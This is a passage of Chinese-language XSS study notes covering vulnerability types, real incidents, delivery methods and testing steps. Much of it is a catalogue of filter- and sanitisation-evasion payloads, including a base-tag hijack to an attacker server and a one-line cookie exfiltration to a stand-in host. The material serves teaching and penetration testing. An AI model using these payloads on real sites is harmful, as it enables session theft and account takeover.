漏洞的一个明显特征；一个常见的场景是开发者通常会写好一些模板，然后提取用户的输入，插入到模板中的指定位置，生成最终发给浏览器的 HTML 文件；此时，如果攻击者在输入中混入 js 代码，则服务器发回的 HTML 文件，将会触发 js 代码的执行； 这个漏洞能否利用成功的关键点在于，攻击者要诱使用户访问一个由攻击者提供的链接，这个链接将指向攻击者想要攻击的网站，而不是攻击者自己的网站；之后，由于浏览器的同源策略，当用户对某个网站发起请求时，浏览器会执行该网站返回的脚本，并允许其访问网站域名对应的浏览器端数据（例如 cookie）；由于脚本是由攻击者设计并插入的，是一段恶意的脚本；该脚本获得目标网站的敏感数据后，再将数据发至攻击者自己的服务器； 保存型 XSS 漏洞A 用户提交的数据，未经过滤或者净化即显示给 B 用户，则可能产生此类漏洞；例如应用程序有运行终端用户进行交互的功能，或者具有管理权限的员工访问普通用户提交的数据的功能； 严格意义来说，保存型漏洞算不上跨站点的XSS 类型了，因为在整个过程中并没有涉及第二个站点，都一直是在同一个站点中； 基于 DOM 的 XSS 漏洞反射型 XSS 的原理是由服务端将恶意代码插入到 HTML 标签中，被客户端浏览器加载后，即可被执行；DOM 型 XSS 是将恶意代码放在参数中，由应用程序 HTML 页面的正常 JS 脚本去提取它，然后触发被执行（感觉有点类似于一个二阶的反射型 XSS）； 进行中的 XSS 攻击真实 XSS 攻击案例一：Apache 问题反馈Apache 基金会官网有一个问题追踪的功能存在反射型 XSS 漏洞，攻击者利用该功能发布了一个恶意链接，诱使其他用户点击；当管理员点击时，他的会话将会发给攻击者；攻击者利用管理员的身份登录后，获得应用程序的管理员权限；然后修改了某个项目默认上传文件夹的位置，将其更改为 Web 根目录中的可执行目录；之后，攻击者向该目录上传了一个木马登录表单，从而获取特权用户的用户名和密码；由于很多用户经常在不同系统中使用相同的密码，攻击者进一步扩大了其攻击范围，延伸到了当前 Web 应用程序之外； 案例二：MySpace 个人资料MySpace 社交网站的用户资料页存在保存型的 XSS 漏洞，虽然其对用户的输入进行了过滤，但是不彻底；攻击者在自己的个人资料介绍页中插入脚本，当其他用户尝试看他的资料时，就会触发脚本的执行；该脚本会触发浏览器执行一系列的操作，包括将攻击者添加为用户的好友，并将脚本进一步插入到用户的个人资料页中，这样当用户的好友查看当前用户资料页，脚本就会呈指数级的进一步扩散；短短几个小时，就有一百多万人将攻击者添加为好友； 案例三：电子邮件电子邮件允许内容为 HTML 格式，同时很多电子邮件程序提供网页版，因此攻击者可以向其他用户发送带有恶意脚本的电子邮件；当邮件在浏览器端被打开时，脚本即可以被浏览器触发执行；（电子邮件是保存型 XSS 漏洞的天然场所）； 案例四：TwitterTwitter 网站曾经成为保存型和 DOM 型漏洞的受害者，原因在于 Twitter 在其客户端大量使用类似 Ajax 的代码，从而使得脚本有机会被触发； XSS 攻击方法传播假消息当某个公司的网站存在保存型 XSS 漏洞时，攻击者可以利用访漏洞，向目标网站注入精心设计的页面，让其看起来像真的一样；当不明真相的用户访问该网站时，会被这些以假乱真的信息所误导，甚至会触发媒体进一步报导，会引发市场恐慌，影响公司股价，之后攻击者可以从中获取利益； 注入木马功能攻击者在目标网站中注入恶意代码，诱使用户执行一些有害操作，例如输入敏感数据（例如证书），然后发送给攻击者；之后攻击者就可以使用该用户的身份登录目标网站，实现自己的利益（很多钓鱼网站的套路）； 另外一种诱使的办法是以某种非常有吸引力的条件为诱饵，要求用户输入他们的敏感信息，例如信用卡信息；由于此时的 URL 是指向真实的域名，所有用户很容易上当； 提升权限仅仅得到普通用户的会话有时并没有什么特别大的用处，因为攻击者不可能时时监控他的服务器，同时当他代表用户进行操作时，也会在应用程序中留下非用户电脑的登录记录；更好的办法是注入自动化的脚本，该脚本会尝试提升攻击者账户的权限，通常来说这会失败；但是等待一段时间，当管理员登录并触发恶意脚本时，提升权限的动作就会成功，成功相当隐蔽，不容易被察觉和发现； 自动填写的表单、本地程序、ActiveX控件XSS 能够是建立在浏览器默认会信用由当前网站提供的脚本，然后执行它；事实上，还存在着其他一些信任关系可以利用，包括： 有些应用程序提供自动完成表单的功能，当该功能被激活后，恶意脚本可以先实例化一个虚拟的表单，触发浏览器会将缓存信息自动填写到表单中，然后恶意脚本就可以访问表单中的内容，发送给攻击者； 一些 Web 应用程序会要求用户将其域名添加到可信站点，这个操作其实是变相提高了 Web 程序在用户本地电脑的权限；当 Web 程序存在 XSS 漏洞时，攻击者就可以利用该漏洞和已经提升后的权限，在用户的电脑上执行更高权限的操作，例如启动某个本地程序； 一些 Web 应用程序为加强客户端的功能，可能提供具备强大方法的 ActiveX 控件，当漏洞被攻击者发现和利用后，攻击者可以进一步利用控件中的方法，来完成恶意操作； XSS 漏洞不仅仅会影响因特网上的 Web 应用程序，同时也会影响内网中的应用程序，例如保存型脚本可以利用邮件在同事之间传播，并利用内网服务器经常信任其域内计算机的特点，攻击内网中的应用程序； XSS 攻击的传送机制传送反射型与基于 DOM 的 XSS 攻击发邮件或即时消息 当攻击者利用漏洞设计好攻击脚本后，他可以有针对性的发给特定用户，例如管理员，假装抱怨网站的某个功能不可用，诱使管理员打开邮件，触发恶意脚本的执行；许多应用程序还提供“推荐给朋友”或者“提交反馈”的功能，这种功能经常会生成一封电子邮件，有时内容和收件人可由用户自定义；攻击者可以邮件内容中插入恶意脚本，当收件人当开时，触发脚本的执行；尤其是被管理员打开时最有用； 在即时消息中向目标用户提供一个包含恶意脚本或参数的 URL； 第三方网站 很多第三方网站允许用户发布 HTML 内容，例如论坛；攻击者可以利用该功能，在第三方网站上发布某个携带恶意 URL 的内容，诱使其他用户点击；该 URL 实际指向的是攻击者服务器的一段恶意脚本，当用户在不知情的情况下点击该 URL，浏览器将会请求恶意脚本到用户的电脑上，并触发脚本的执行； 攻击者可以付费发布广告，然后在广告中包含某个指向漏洞网站的 URL，诱使用户点击，触发脚本执行；很多公司会付费进行推广，同时设计相关的广告；攻击者可以设计一个类似的广告，让它看起来像真的一样，并付费让其混杂在该公司的实际广告中，这种做法非常以假乱真，用户有很大概率会点击；该做法相当于攻击者付费买进了大量的用户会话； 自建站点 攻击者可以自建站点，包含一些有吸引力的内容，同时也包含一些恶意脚本，触发用户向易受攻击的应用程序提出包含 XSS 的语法；如果用户刚好登录了易受攻击的应用程序，并且碰巧浏览了攻击者的站点，攻击者就有机会获得用户的会话； 攻击者可以在自建站点上模拟搜索引擎的功能，当用户提交搜索的关键字后，攻击者向用户展示搜索结果，诱使用户点击看上去最相关的内容，但实际上内容的链接指向的是某个易受攻击的网站； 传送保存型 XSS 攻击带内传送攻击者控制的数据，通过应用程序本身的 Web 界面提交给应用程序，并最终在 Web 界面上呈现，常见显示位置包括： 个人信息字段：例如姓名、电子邮件、地址、电话等； 文档、上传文件和其他数据的名称； 提交给管理员的反馈或问题； 向其他应用程序用户传送的消息、注释、问题等； 记录在应用程序日志中，管理员通过浏览器进行查看的内容，例如 URL, 用户名, HTTP Referer, User-Agent 等； 在用户之间共享的上传文件内容等； 带外传送在应用程序之外的界面上显示控制数据，例如通过电子邮件发送恶意链接，诱使受害者进行点击；链接最终在受害者的邮件页面上显示，而不是受攻击的应用程序界面上显示； 漏洞复合攻击有时候单个漏洞可能属于风险极低的漏洞，虽然漏洞存在，但对于攻击者来说可能并没有利用的价值；但是当多个低风险的漏洞同时存在，并可以整合利用时，有可能会变成一个大漏洞； 例1：昵称只有本人可见的功能，是一个小漏洞，但同时用户有权限修改其他用户的昵称，则它将变成一个巨大的漏洞； 例2：应用程序中包含保存型 XSS 漏洞，同时仅向用户显示的个人数据存在跨站请求伪造的漏洞，二者结合将变成一个巨大的漏洞； 查找并利用 XSS 漏洞使用某个设计的字符串，将其作其参数值，提交给应用程序页面上的每一个参数，监控应用程序的响应，但该字符串是否会出现在响应中，如果会的话，表示程序很可能存在 XSS 漏洞； 常见的漏洞验证字符串 “&gt;alert(document.cookie)\"，该字符串的要点在于通过第一个右尖括号，结果插入位置前面的 HTML 标签，然后引入一段 script 脚本； 为了避免 XSS 漏洞，许多应用程序会对用户的输入进行过滤，删除或转义其他的 \"\" 或者尖括号等字符；但是开发者的过滤机制经常有缺陷，攻击者可以通过对关键符号进行转义、插入空格、改变大小写、多层嵌套等方法来避开过滤，例如设计为下面这种类型的输入： 如果应用程序没有对输入进行过滤，则很容易通过输入并验证响应的方式，来实现漏洞检测的自动化；但如果应用程序对输入进行了过滤，由于过滤规则一开始是未知的，因此不能简单的通过比对来实现自动化检测，此时需要手工检测，并观察和猜测过滤规则，以找到规避的方式； 查找并利用反射型 XSS 漏洞在解析应用程序功能阶段，收集所有的用户输入点，针对每个输入点，系统性的实施以下步骤，以便找出哪些输入点最终会显示在界面上： 提交一个设计过的良性字符串（例如纯字母组成），确保该字符串之前不可能出现在程序中的任何位置； 确认该良性字符串在应用程序中出现的所有位置； 对于每个反射，记录其语法上下文； 提交针对语法上下文而设计的数据，尝试在响应中引入任意脚本； 如果提交的数据被阻止或者净化，导致脚本无法执行，尝试了解净化规则，以避开过滤机制； 确认用户输入的反射渗透测试步骤 选择任意一个字符串，确保它之前未出现在应用程序中的任何地方，并且让其仅包含字符，这样不会受到过滤规则的影响；提交该字符串，将其做为某个参数值，每次请求只针对一个参数； 针对每次请求，监管应用程序的响应，看其中是否出现同一个字符串；记录下所有满足条件的参数； 测试 GET 和 POST 请求；当在 POST 请求中发现 XSS 漏洞时，改变请求方法，确认是否可以通过 GET 请求实施相同的攻击； 除了请求参数外，还应该检查请求的消息头中的内容，是否也会出现在响应的内容中；如果会的话，意味着可以通过定制消息头，来利用 XSS 漏洞； 测试插入脚本的反射当找到反射位置后，务必手动检查每一个位置，以便确定该位置是否可以利用；针对该位置的上下文语法，针对性的设计输入，以便输入的脚本可以被执行； 例1：标签的属性值位置 字符串出现在 input 标签的 value 属性上，此时可以通过设计脚本，针对该处的上下文语法，结束 input 标签，并引入自定义的脚本； 另外，如果应用程序过滤输入，此时也可以不引入脚本，而是针对该位置的特点，在 input 标签中引入事件处理器，例如：\" onfocus=\"alert(1) 例2：Javascript 字符串如果输入做为变量值出现在响应的脚本中，则可以针对性的插入经过设计的字符串，让其截断原来的引号，改变语义，执行目标脚本； 注意保证插入位置后续的脚本语法正确，以便浏览器可以正确执行，有时可以通过插入 // 将后续的脚本变成注释； 例3：包含 URL 的属性 HTML 标签 的 href 属性原来支持插入脚本，之前一直不知道这个事情； 渗透测试步骤 针对在解析过程中记下的每一个漏洞位置，采取以下措施： 检查 HTML 源代码，确定受控制字符串的位置； 如果字符串出现在多个位置，则每个位置都可能是一个潜在的漏洞，应加以分析； 如果字符串出现在 HTML 中，则可以考虑如果设计字符串，让脚本得以执行； 向应用程序提交字符串，测试是否有效果，返回的响应是否与预期一致； 探查防御性过滤通常情况下，很多应用程序都会实施一定程度的输入过滤检查，因此并不一定能够得到原始的输入，但是，这些过滤机制或多或少也都会存在漏洞，应该进一步分析并加以利用； 常见的防御机制： 应用程序本身或者应用程序的防火墙，使用某种输入匹配筛查，发现了攻击意图，完全阻止了输入； 应用程序接受了输入，但对输入进行了净化或编码； 应用程序将输入截短为某个固定的最大长度； 避开基于匹配的过滤应用程序使用某种匹配机制，来检查输入中是否包含不合法的字符；此时，可轮流删除字符串的不同部分，看输入是否仍然被阻止，以便查明到底是哪部分的字符串，触发了检查；找到后，有针对性的设计输入，以便可以避开检查； 有四种常见的方法，可以用来在 HTML 页面中引入脚本代码； 插入脚本的方法标签插入 或者 标签，并利用这两个标签的 data 或 href 属性，来插入脚本，同时，对脚本进行编码（例如 base64），以避开检查 123&lt;object data=&quot;data:text/html, &lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/object&gt;&lt;object data=&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;&lt;a href=&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;点击这里&lt;/a&gt; 上面的 base64 字符串是对字符串 alert(1) 的编码； 事件很多标签都支持各种各样的事件，有些事情甚至不需要用户做任何交互即可执行，因此，只要将事件插入到标签的属性中，就可以让脚本得以执行； 1234567891011121314&lt;!-不需要交互需要可执行的脚本-&gt;&lt;xml onreadystatechange=alert(1)&gt;&lt;/xml&gt;&lt;style onreadystatechange=alert(1)&gt;&lt;/style&gt;&lt;iframe onreadystatechange=alert(1)&gt;&lt;/iframe&gt;&lt;object onerror=alert(1)&gt;&lt;/object&gt;&lt;object type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;/object&gt;&lt;img type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;input type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;isindex type=image src=valid.gif onreadystatechange=alert(1)&gt;&lt;/isindex&gt;&lt;script onreadystatechange=alert(1)&gt;&lt;/script&gt;&lt;bgsound onreadystatechange=alert(1)&gt;&lt;/bgsound&gt;&lt;body onbeforeactivate=alert(1)&gt;&lt;/body&gt;&lt;body onactivate=alert(1)&gt;&lt;/body&gt;&lt;body onfocusin=alert(1)&gt;&lt;/body&gt; 12345678&lt;input autofocus onfocus=alert(1)&gt;&lt;input autofocus onblur=alert(1)&gt;&lt;body onscroll=alert(1)&gt;&lt;/body&gt;&lt;video src=1 onerror=alert(1)&gt;&lt;/video&gt;&lt;audio src=1 onerror=alert(1)&gt;&lt;/audio&gt;&lt;!-HTML5 允许在结束标签中使用事件处理器-&gt;&lt;a&gt;&lt;/a onmousemove=alert(1)&gt; 伪源HTML 中有些标签的脚本也支持插入脚本，例如 object、a、iframe、embed 等； 12345678&lt;object data=javascript:alert(1)&gt;&lt;/object&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;embed src=javascript:alert(1)&gt;&lt;event-source src=javascript:alert(1)&gt;&lt;/event-source&gt; &lt;form id=&quot;test&quot;&gt; &lt;button form=&quot;test&quot; formaction=javascript:alert(1)&gt;&lt;/form&gt; HTML5 引入的 event-source 标签特别有用，因为该标签包含一个连字符，这意味着传统的正则表达式过滤机制需要支持它，从而引入了新的漏洞可能性； 动态样式HTML 支持在标签的 style 属性中使用表达式，来对标签的样式进行求值，这意味着可以利用该特性，插入恶意脚本 1&lt;x style=behavior:url(#default#time2) onbegin=alert(1)&gt;&lt;/x&gt; 避开过滤：HTML一些应用程序使用正规表达式，对于前面提到的各种插入办法的输入进行过滤，为了避开过滤，需要对输入进行模糊处理，常用的方法如下： 标签名称改变标签名称的大小写 1&lt;iMg onerror=alert(1) src=&quot;a&quot;&gt; 在任意位置插入 NULL 字节 123&lt;[%00]img onerror=alert(1) src=&quot;a&quot;&gt;&lt;/[%00]img&gt;&lt;i[%00]mg onerror=alert(1) src=&quot;a&quot;&gt;&lt;/i[%00]mg&gt;&lt;!-此处的 %XX 格式表示某个字符的 ASCII 的十六进制编码-&gt; NULL 常常可以有效应用防火墙的过滤，因为防火墙程序通常将 NULL 识别为字符串的终止符，从而无法发现 NULL 字节后的恶意插入； 直接修改标签名称，以避开针对标签名称的过滤 1&lt;x onclick=alert(1) src=a&gt;Click here&lt;/x&gt; 劫持 base 标签，base 标签用来指定脚本源的域名，因此，如果应用程序有使用 base，并且在 base 之后的脚本引用，都是相对路径，那么可以在原来的 base 之后，插入一个新的 base ，将其指向攻击者自己的服务器，这样后续的脚本就会改向攻击者的服务器请求脚本； 1234&lt;base href=&quot;http://mdattacker.net/badscripts/&quot;&gt;...&lt;script src=&quot;goodscript.js&quot;&gt;&lt;/script&gt;&lt;!-通常 base 标签仅允许出现在 head 部分，但少数浏览器如 firefox 允许出现在页面的任何位置-&gt; 使用一些特殊字符来替代空格，干扰过滤规则 1234567&lt;img/onerror=alert(1) src=a&gt;&lt;img[%09]onerror=alert(1) src=a&gt;&lt;img[%0d]onerror=alert(1) src=a&gt;&lt;img[%0a]onerror=alert(1) src=a&gt;&lt;img/&quot;onerror=alert(1) src=a&gt;&lt;img/&#x27;onerror=alert(1) src=a&gt;&lt;img/anyjunk/onerror=alert(1) src=a&gt; 即使在实施攻击时不需要任何标签属性，但应始终在标签名称后面添加一些多余的内容，因为这样可以避开一些简单的过滤，例如：&lt;img&#x2F;anyjunk&#x2F;onerror&#x3D;alert(1) src&#x3D;a&gt; 属性名称就像标签名称一样，也可以在属性的名称中使用 NULL 技巧，例如：&lt;img o[%00]nerror&#x3D;alert(1) src&#x3D;a&gt;，这样可以避开基于 on 开头的属性名称的过滤； 属性分隔符属性的分隔一般使用空格，但实际上也可以使用双引号或者单引号（IE 上还可以使用重音符）； 123&lt;img onerror=&quot;alert(1)&quot;src=a&gt;&lt;img onerror=&#x27;alert(1)&#x27; src=a&gt;&lt;img onerror=`alert(1)` src=a&gt; 通过使用引号或者重音符来分隔属性，并在标签名称后面使用特殊符号来替代空格，则可以实现整个输入都没有使用任何空格的情况，从而避开一些简单的过滤 1&lt;img/onerror=&quot;alert(1)&quot;src=a&gt; 属性值属性值同样也可以使用 NULL 技巧，并且还可以使用 HTML 编码字符对输入进行模糊处理 1234&lt;img onerror=a[%00]alert(1) src=a&gt;&lt;img onerror=a&amp;#x6c;ert(1) src=a&gt;&lt;!-以下使用 HTML 编码对 javascript 伪源进行了编码-&gt;&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29;&gt; 在使用 HTML 编码时，应注意到，浏览器支持多种编码变体，例如可以使用十进制或者十六进制格式，添加多余的前导零，并省略结尾分号等； 123456789&lt;!-十六进制，前导零-&gt;&lt;img onerror=a&amp;#x06c;ert(1) src=a&gt;&lt;img onerror=a&amp;#x006c;ert(1) src=a&gt;&lt;img onerror=a&amp;#x0006c;ert(1) src=a&gt;&lt;!-十进制，前导零，省略分号-&gt;&lt;img onerror=a&amp;108;ert(1) src=a&gt;&lt;img onerror=a&amp;#0108;ert(1) src=a&gt;&lt;img onerror=a&amp;#108ert(1) src=a&gt;&lt;img onerror=a&amp;#0101ert(1) src=a&gt; 标签括号有些应用程序会对过滤后的输入进行不必要的 HTML 解码，例如 123456&lt;!--实际输入如下，没有使用任何的括号，并使用 %25 和 %20 来代替 % 和空格--&gt;%253cimg%20onerror=alert(1)%20src=a%253e&lt;!--第一层解码，%25 和 %20 被转换为实际的百分符和空格，变成如下--&gt;%3cimg onerror=alert(1) src=a%3e&lt;!--由于应用程序会对输入进行 HTML 解码，导致最终呈现在浏览器中的输入变成如下字符--&gt;&lt;img onerror=alert(1) src=a&gt; 有些应用程序会将不常见的 Unicode 字符转换为相近的 ASCII 字符进行处理，例如双尖括号会转移为单尖括号，从而有机会避开过滤规则； 12&lt;&lt;img onerror=alert(1) src=a&gt;&gt;%u00ABimg onerror=alert(1) src=a%u00BB 很多过滤规则的算法比较简单，例如简单的匹配起始和结束的尖括号，提取内容，并将其与黑名单进行比较，来识别 HTML 标签，此时可以使用多余的括号来避开过滤（前提是浏览器接受这种多余的括号） 1&lt;&lt;script&gt;alert(1);//&lt;&lt;/srcipt&gt; 由于历史原因，有大量的合法的网站，使用不规范的 HTML 格式，而浏览器为了尽可能的兼容它们以进行正确的显示，导致浏览器接受各种不合法的 HTML 内容格式，并自动将其转换为规范的格式，这就为漏洞留下了大量的机会；可使用浏览器自带的工具，如“查看生成的源”，来查看浏览器如何转换一些不规范的格式； 字符集使用不同的字符集来编码输入，常常可以避开过滤规则，不过它的挑战在于如何让浏览器按正确的字符集进行解析，一般需要能够控制 HTTP 响应头，例如 Content-Type 属性，或者对应的 HTML 元标签； 1&lt;!--对 &lt;script&gt;alert(document.cookie)/&lt;/script&gt; 在不同字符集下的编码--&gt; 如果应用程序默认支持使用多字节的字符集，例如 Shift-JIS，则可以在输入中使用在该字符集中具有特殊意义的字符，来避开输入过滤 例如某个应用程序支持 Shift-JIS 字符集，并在返回的响应中包括如下内容： 12&lt;!--用户输入1 和 用户输入2 两个位置可以根据用户输入显示的内容--&gt;&lt;img src=&quot;image.gif&quot; alt=[&quot;用户输入位置1&quot;] /&gt; ...[&quot;用户输入位置2&quot;] 假设应用程序的过滤规则限制了在用户输入位置1使用引号，并在用户输入位置2限制使用尖括号，则此时可以将输入1和输入2分别设计为如下： 输入1： %f0 输入2：”onload&#x3D;alert(1); 根据 Shift-JIS 字符集，%f0 后面的引号，将被解析为 %f0 的组成部分，从而使用原本 HTML 属性中的引号失去作用，之后一直到输入2的位置的引号才完成配对，从而成功的插入了 onload&#x3D;alert(1) 语句； 较少用的字符集包括：Shift-JIS、EUC-JP、BIG5 等； 避开过滤：脚本代码有些过滤规则会对输入中的 javascript 敏感字符进行过滤，例如分号、圆括号、圆点等；此时需要对这些关键符号先进行模糊处理才行，常见的处理办法如下： 转义javascript 支持多种转义方法，因此可以使用这些方法，对关键字符进行转义处理； 12&lt;!--对字母 L 进行 Unicode 转义 --&gt;&lt;script&gt;a\\u006cert(1);&lt;/script&gt; 如果能够使用 eval 命令，则可以将需要执行的代码，弄成字符串，传给 eval 命令实现执行； 12345&lt;script&gt;eval(&#x27;a\\u006cert(1)&#x27;);&lt;/script&gt; // Unicode 转义&lt;script&gt;eval(&#x27;a\\x6cert(1)&#x27;);&lt;/script&gt; // 十六进制转义&lt;script&gt;eval(&#x27;a\\154ert(1)&#x27;);&lt;/script&gt; // 十进制转义&lt;script&gt;eval(&#x27;a\\l\\ert&#x27;(1\\);&lt;/script&gt; // 字符串中带转义符将会被忽略 动态构建字符串123&lt;script&gt;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;;&lt;/script&gt;&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41));&lt;/script&gt;&lt;script&gt;eval(atob(&#x27;amF2YXNjcmlwdDphbGVydCgxKQ&#x27;));&lt;/script&gt; // Base64 编码的方式 替代 eval 的方法12&lt;script&gt;&#x27;alert(1)&#x27;.replace(/.+/,eval)&lt;/script&gt; // 字符串的内置函数+正则替换&lt;script&gt;function::[&#x27;alert&#x27;](1)&lt;/script&gt; 替代圆点12&lt;script&gt;alert(document[&#x27;cookie&#x27;]&lt;/script&gt; // 使用中括号访问对象属性的方法&lt;script&gt;with(document)alert(cookie)&lt;/script&gt; // 使用 with 语法 组合多种技巧例如先使用 Unicode 对关键字进行转义，然后再使用 HTML 编码将 Unicode 用到的反斜杠进行编码，以避开过滤； 1&lt;img onerror=eval(&#x27;al&amp;#x5c;u0065rt(1)&#x27;) src=a&gt; // 此处对 alert 单词中的 e 字母先用 Unicode 进行转义，然后再将 Unicode 转义中用到反斜杠进行 HTML 编码， 此外还可以对 onerror 属性值中的任何字符进行 HTML 编码，以便进一步隐藏攻击； 很多针对 Javascript 的过滤规则一般会核查 Javascript 中使用到的关键字符，例如引号、点号、括号等，对这些符号使用 HTML 编码后，就可以避开过滤规则； 使用 VBScript通常 XSS 攻击都是使用 Javascript 语言来插入恶意脚本，但是有些浏览器除了支持 Javascript 外，还支持其他语言，例如 IE 浏览器支持 VBSript；因此，如果存在此种情况，则攻击者可以根据 VBSript 的语法语法特征来设计攻击脚本，以避开过滤规则； 1234&lt;script language=vbs&gt;MsgBox 1&lt;/script&gt;&lt;img onerror=&#x27;vbs:MsgBox 1&#x27; src=a&gt;&lt;img oneeror=MsgBox+1 language=vbs src=a&gt; // Msgbox 之后接的加号表示空格，用来针对空格的过滤// 以上例子的 vbs 字样，同时还可以替换为 vbsript 字样，二者的效果是一样 VBSript 的一些特点： 不使用括号也可以实现函数的调用（可避开针对括号的过滤）； 不区分大小写（Javascript 语法规则要求表达式需要使用小写，不支持大写，可绕开进行大写转换的净化规则）； 组合 Javascript 和 VBSript可以设计从 Javascript 中调用 VBScript，或者反过来也行，从而增加攻击的复杂度，以避开过滤规则； 12345&lt;script&gt;execScript(&quot;MsgBox 1&quot;, &quot;vbscript&quot;);&lt;/script&gt;&lt;script language=vbs&gt;execScript(&quot;alert(1)&quot;)&lt;/script&gt;// 以下是一个嵌套使用两种脚本的复杂示例&lt;script&gt;execScript(&#x27;execScript&quot;alert(1)&quot;, &quot;javascript&quot;&#x27;, &quot;vbscript&quot;);&lt;/script&gt; 由于 VBSript 不区分大小写，即使输入被全部转换成大写后，仍然可以被浏览器执行，这意味着如果想实现 Javascript 的调用，可以使用 VBSript 脚本，调用内置的 LCASE 函数，将被净化规则转换后的大写，再次转换成小写来实现； 12&lt;SCRIPT LANGUAGE=VBS&gt;EXECSCRIPT(LCASE(&quot;ALERT(1)&quot;))&lt;/SCRIPT&gt;&lt;IMG ONERROR=&quot;VBS:EXECSCRIPT LCASE(&#x27;ALERT(1)&#x27;)&quot; SRC=A&gt; 使用经过编码的脚本早期微软在 IE 浏览器中，使用某种定制的脚本编码，对脚本进行模糊处理，以防止用户查看 HTML 页面的源代码，但后面该编码被破解了，导致了额外的一个漏洞，即攻击者可以根据该编码规则，先对输入进行模糊处理，以避开过滤规则，然后输入最终又会被浏览器解码成正确的脚本内容； 避开净化 净化是一种防守策略，不过貌似直接拒绝请求，并根据情况加入黑名单不是更好？ 净化是一种应对攻击的常用策略，其中一种常见的方法是将输入进行 HTML 编码，这样就可以避免输入的脚本被浏览器执行；有时候，应用程序甚至会删除输入中的特定字符，以清除其中可能包含的恶意内容；此时需要做两件事情： 了解程序对哪些字符实施了净化规则，然后组合多种技巧避开它们； 了解输入内容被净化后，余下的内容有无可能实施攻击 净化算法经常有漏洞，例如： 1234567891011121314151617181920212223242526// 只替换了第一个匹配值输入：&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt;alert(1)&lt;/script&gt;// 没有递归输入：&lt;src&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt;alert(1)&lt;/script&gt;// 对多个关键字实施净化时，使用固定的处理顺序，因此攻击者可以利用该顺序，让第一个步骤未能找到匹配值，然后利用第二个步骤的净化结果，得到想要插入的正确脚本输入：&lt;src&lt;object&gt;ipt&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt;alert(1)&lt;/script&gt;// 净化规则会转义引号，但未转义反斜杠本身，因此，攻击者可以在输入中加入反斜杠，对净化规则添加的反斜杠进行转义，使其失效；输入：var a = foo\\&quot;; alert(1); //结果：var a = &quot;foo\\\\&quot;; alert(1);//&quot;;// 未处理尖括号，攻击者有机会利用转义会废弃原脚本，原因：浏览器会优先解析 HTML 标签，再处理 js 脚本输入：&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;结果：&lt;script&gt; var a = &quot;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;// 虽然此处变量 a 的声明中只包含1个引号，不符合 js 语法，可能会出现报错，但问题不大，因为浏览器会跳过，直接执行下一段脚本// 如果注入的位置处于事件中，则可以使用 HTML 编码来避开净化位置 foo：&lt;a href=&quot;#&quot; onclick=&quot;var a = &#x27;foo&#x27;&quot;;&gt;&lt;/a&gt;输入：foo&amp;apos;; alert(1); //直接结果：&lt;a href=&quot;#&quot; onclick=&quot;var a = &#x27;foo&amp;apos;; alert(1); //&#x27;&quot;&gt;&lt;/a&gt;解码后结果：&lt;a href=&quot;#&quot; onclick=&quot;var a = &#x27;foo&quot;; alert(1); //&#x27;&quot;&gt;&lt;/a&gt; 一些净化规则的设计者认为对用户的输入进行 HTML 编码，可以规避 XSS 攻击，但由于浏览器在编译 HTML 文本前，会先对其进行 HTML 解码的动作，因此，规避攻击的意图不一定可以实现； 避开长度限制方法一：使用尽可能短的脚本 1234567// 将 cookie 传送至主机名为 a 的服务器open(&quot;//a/&quot;+document.cookie)// 从主机名为 a 的服务器加载一段脚本&lt;script src=http://a&gt;&lt;/script&gt;注：以上的服务器只能针对局域网内的机器，如果是因特网上的机器，只提供主机名还不够 有一些第三方工具可以用来尽量缩短有效的 js 代码，例如 javascript packer 工具 方法二：将一段攻击脚本拆分成多段，分散在同一个页面的不同位置 123456789101112// 源代码，接收请求 URL：https://sample.com/account.php?page_id=244&amp;seed=123&amp;mode=normal&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;244&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;seed&quot; value=&quot;123&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;normal&quot;&gt;// 攻击者可以将请求参数设计为如下格式：https://sample.com/account.php?page_id=&quot;&gt;&lt;script&gt;/*&amp;seed=*/alert(document.cookie);/*&amp;mode=*/&lt;/script&gt;得到的结果如下：&lt;input type=&quot;hidden&quot; name=&quot;page_id&quot; value=&quot;&quot;&gt;&lt;script&gt;/*&gt;&lt;input type=&quot;hidden&quot; name=&quot;seed&quot; value=&quot;*/alert(document.cookie);/*&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;*/&lt;/script&gt;&quot;&gt;以上结果将执行 &quot;alert(document.cookie);&quot;，同时该脚本前后位置的部分变成了 HTML 注释； 当使用了长度限制的过滤后，例如将名称限制在 12 个字符以内，开发者有可能觉得如此短的长度，不可能实施有效的 XSS 攻击，因此没有进一步对该输入进行净化过滤，从而攻击者有机会将攻击荷载分散到不同的多个位置，然后其组合起来后，将有效的注释掉两个位置中间的部分； 有可能攻击者在某个中间位置，因为没有长度限制，实施了很严格的净化过滤，但由于前后位置已经被攻陷，导致中间位置的净化完全失去作用； 方法三：将反射型漏洞转化成 DOM 型漏洞 1234567// 假设某个反射型漏洞存在长度限制，攻击者可以在合理的长度范围内，注入一段脚本，让其访问另外一个标签节点的值，并执行它&lt;script&gt;eval(location.hash.slice(1)&lt;/script&gt; // 该段脚本只有45个字符，但它可以在页面中生成一个 DOM 漏洞，然后攻击者再利用生成的 DOM 漏洞来创造机会，执行位于片断字符串中的另一段脚本；完整的请求为：http://sample.com/error/5/error.ashx?message=&lt;script&gt;eval(location.hash.substr(1)&lt;/script&gt;#alert(&#x27;long script insert 